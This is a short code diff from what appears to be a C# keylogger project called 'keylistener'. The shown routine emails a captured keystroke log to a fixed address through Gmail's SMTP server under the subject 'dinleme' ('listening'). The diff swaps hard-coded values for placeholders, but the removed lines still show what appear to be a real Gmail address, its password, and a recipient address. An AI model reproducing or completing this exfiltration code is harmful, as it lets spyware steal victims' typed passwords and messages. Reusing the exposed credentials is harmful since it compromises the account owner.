@@ -62,13 +62,13 @@ namespace keylistener
             MailMessage msj = new MailMessage();
             SmtpClient client = new SmtpClient();
 
-            client.Credentials = new System.Net.NetworkCredential("baysagmahmut@gmail.com", "meriyonet123");
+            client.Credentials = new System.Net.NetworkCredential("gündericieposta", "parola");
             client.Port = 587;
             client.Host = "smtp.gmail.com";
             client.EnableSsl = true;
 
-            msj.To.Add("mbaysag1080@gmail.com");
-            msj.From = new MailAddress("baysagmahmut@gmail.com");
+            msj.To.Add("alicıeposta@gmail.com");
+            msj.From = new MailAddress("göndericieposta@gmail.com");
             msj.Subject = "dinleme";
             msj.Body = log.ToString();
 
